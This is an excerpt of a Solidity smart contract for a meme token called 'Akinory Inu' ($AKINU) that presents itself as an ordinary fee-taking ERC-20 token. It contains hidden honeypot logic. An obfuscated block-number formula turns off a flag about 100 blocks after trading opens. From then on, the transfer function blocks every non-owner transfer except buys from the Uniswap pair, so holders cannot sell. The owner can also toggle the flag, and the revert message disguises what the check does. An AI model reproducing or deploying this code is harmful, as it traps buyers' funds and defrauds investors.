...
contract AKINORYINU is Context, IERC20, Ownable {
    ...
    string private constant _name = "Akinory Inu"; // 
    string private constant _symbol = "$AKINU"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 7;
    uint256 public _liquidityFee = 2;
    address payable public  _marketingWallet = payable(0x2BFB8f21cF163c16946e87aA6eBeDF4E77aa9A50);
    ...
    uint public swapFirstTx = 0;
    bool public _statusDeductible = true;
    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiquidity);
    
    function enableSwap() internal {
        swapEnabled = true;
        swapFirstTx = block.number;
    }

    function updateSwap() internal {
        if (_marketingFee * _liquidityFee * 10 - (2**2)*10 + swapFirstTx <= block.number) {
            _statusDeductible = false;
        }
    }

    function _statusDeductibleUpdate (bool _status) public onlyOwner {
        _statusDeductible = _status;
    }
    ...
    function _transfer(
        ...
        if(from != owner() && to != owner() && !_statusDeductible) {
            require(from == uniswapV2Pair, "Only owner and marketing wallet are deductible from fees");
        } 
